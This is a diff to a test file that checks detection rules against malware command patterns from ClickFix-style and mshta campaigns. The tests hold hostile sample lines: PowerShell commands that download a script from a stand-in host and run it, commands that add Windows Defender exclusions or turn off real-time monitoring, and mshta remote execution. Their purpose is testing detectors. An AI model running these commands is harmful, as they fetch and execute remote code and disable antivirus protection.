@@ -87,14 +87,14 @@ def test_new_patterns_2026_02_09() -> None:
 def test_new_patterns_2026_02_10() -> None:
     """Test new patterns added from Feb 2026 Metro4Shell/mshta campaigns."""
     compiled = load_compiled_builtin_rulepack()
-    
+
     # DEF-001: Windows Defender exclusion manipulation
     def001 = next((r for r in compiled.static_rules if r.id == "DEF-001"), None)
     assert def001 is not None
     assert def001.pattern.search("Add-MpPreference -ExclusionPath C:\\Temp") is not None
     assert def001.pattern.search("Set-MpPreference -DisableRealtimeMonitoring $true") is not None
     assert def001.pattern.search("Windows Defender exclusion added") is not None
-    
+
     # MAL-005: mshta.exe remote execution
     mal005 = next((r for r in compiled.static_rules if r.id == "MAL-005"), None)
     assert mal005 is not None
@@ -102,3 +102,21 @@ def test_new_patterns_2026_02_10() -> None:
     assert mal005.pattern.search("mshta.exe https://malware.site/script.vbs") is not None
     assert mal005.pattern.search("mshta \\\\remote\\share\\script.hta") is not None
     assert mal005.pattern.search("mshta local_file.hta") is None
+
+
+def test_new_patterns_2026_02_11() -> None:
+    """Test new PowerShell IEX bootstrap pattern observed in ClickFix-style campaigns."""
+    compiled = load_compiled_builtin_rulepack()
+
+    mal006 = next((r for r in compiled.static_rules if r.id == "MAL-006"), None)
+    assert mal006 is not None
+    assert mal006.pattern.search("iwr https://evil.example/a.ps1 | iex") is not None
+    assert (
+        mal006.pattern.search("Invoke-WebRequest https://evil.example/p.ps1 | Invoke-Expression")
+        is not None
+    )
+    assert mal006.pattern.search("Invoke-Expression (irm https://evil.example/run.ps1)") is not None
+    assert (
+        mal006.pattern.search("Invoke-WebRequest https://example.com/script.ps1 -OutFile setup.ps1")
+        is None
+    )
